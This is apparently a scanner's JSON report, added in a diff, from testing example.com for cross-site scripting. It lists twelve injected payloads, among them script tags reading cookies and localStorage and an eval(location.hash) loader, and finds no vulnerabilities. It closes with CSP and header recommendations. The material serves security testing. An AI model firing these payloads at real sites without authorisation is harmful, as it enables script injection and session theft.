@@ -1,0 +1,204 @@
+{
+  "url": "https://example.com",
+  "timestamp": "2025-04-16T19:42:38.436422",
+  "tests_run": 12,
+  "vulnerabilities_found": 0,
+  "analysis": [
+    {
+      "payload": "<ImG sRc=x OnErRoR=alert(\"XSS\")>",
+      "test_url": "https://example.com?xss=<ImG sRc=x OnErRoR=alert(\"XSS\")>",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "\" onmouseover=\"alert('XSS')\" \"",
+      "test_url": "https://example.com?xss=\" onmouseover=\"alert('XSS')\" \"",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "' onerror='alert(\"XSS\")' '",
+      "test_url": "https://example.com?xss=' onerror='alert(\"XSS\")' '",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "\" onfocus=\"alert('XSS')\" autofocus=\"",
+      "test_url": "https://example.com?xss=\" onfocus=\"alert('XSS')\" autofocus=\"",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "\";alert('XSS');//",
+      "test_url": "https://example.com?xss=\";alert('XSS');//",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "';alert('XSS');//",
+      "test_url": "https://example.com?xss=';alert('XSS');//",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "\\\";alert('XSS');//",
+      "test_url": "https://example.com?xss=\\\";alert('XSS');//",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<script>eval(location.hash.slice(1))</script>",
+      "test_url": "https://example.com?xss=<script>eval(location.hash.slice(1))</script>",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<script>alert(document.domain)</script>",
+      "test_url": "https://example.com?xss=<script>alert(document.domain)</script>",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<script>alert(document.cookie)</script>",
+      "test_url": "https://example.com?xss=<script>alert(document.cookie)</script>",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<script>alert(localStorage.getItem(\"sensitive\"))</script>",
+      "test_url": "https://example.com?xss=<script>alert(localStorage.getItem(\"sensitive\"))</script>",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    },
+    {
+      "payload": "<script>alert(name)</script>",
+      "test_url": "https://example.com?xss=<script>alert(name)</script>",
+      "status_code": 200,
+      "vulnerabilities": [],
+      "reflection_points": [
+        {
+          "framework": "angular",
+          "context": "framework_detection",
+          "reflection_type": "framework"
+        }
+      ],
+      "risk_level": "low"
+    }
+  ],
+  "base_analysis": {
+    "url": "https://example.com",
+    "timestamp": "2025-04-16T19:42:38.974793",
+    "vulnerabilities": [],
+    "reflection_points": [
+      {
+        "framework": "angular",
+        "context": "framework_detection",
+        "reflection_type": "framework"
+      }
+    ],
+    "sinks_identified": [],
+    "defense_mechanisms": [],
+    "risk_level": "low",
+    "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+    "sanitization_detected": {
+      "detected": true,
+      "mechanisms": [
+        "tag_removal"
+      ]
+    },
+    "dom_analysis": {
+      "vulnerable_patterns": [],
+      "sinks_identified": [],
+      "sources_identified": [],
+      "risk_level": "low"
+    }
+  }
+}
